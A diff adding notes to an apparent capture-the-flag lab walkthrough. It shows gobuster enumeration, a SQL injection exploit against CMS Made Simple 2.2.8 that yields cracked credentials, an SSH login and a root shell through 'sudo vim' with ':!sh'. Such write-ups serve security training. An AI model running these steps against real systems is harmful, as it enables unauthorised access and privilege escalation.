@@ -21,3 +21,45 @@ nmap -sV --script vulners --script-args mincvss=5.0 10.10.17.246
 
 vulscan tutorial
 https://github.com/scipag/vulscan
+
+
+
+Finding all paths of a website using a wordlist.
+In this instance we are using gobuster with a DirBuster word list
+
+gobuster dir -w /opt/node_modules/dirbuster/lists/directory-list-2.3-medium.txt -u http://10.10.248.51
+FLAGS
+-u specify url
+-w link wordlist
+
+Result:
+/simple
+/server-status
+
+The later one is inaccessible.
+
+By visiting the /simple we can see that CMS Made Simple is being hosted, with a version of 2.2.8
+Doing a simple google search for CVEs for this shows a vulnerability for remote SQL Injections prior to version 2.2.10
+
+The Details of the CVE can be found in -- https://packetstormsecurity.com/files/152356/CMS-Made-Simple-SQL-Injection.html
+
+There is code to run the SQL Injection in which we have to pass in a IP Address.
+Install required libraries and then run the application while passing in relevant data with flags.
+
+Command - python app.py -u http://10.10.248.51 --crack -w /opt/node_modules/dirbuster/lists/directory-list-2.3-medium.txt    
+
+After that you will recieve the following details :-
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Password cracked: secret
+
+now you can login with these credentials using ssh but it is required to specify ssh port 2222, (not the normal port)
+Command - ssh mitch@10.10.248.51 -p 2222
+
+We can now see the flag in the home directory "G00d j0b, keep up!"
+
+
+now using the command sudo -l, we can find out which user can run some applications witg root priviliges, and we can see that Mitch can use vim.
+so we sudo open vim and get a shell by typing in :!sh to spawn a shell within vim that has root access.
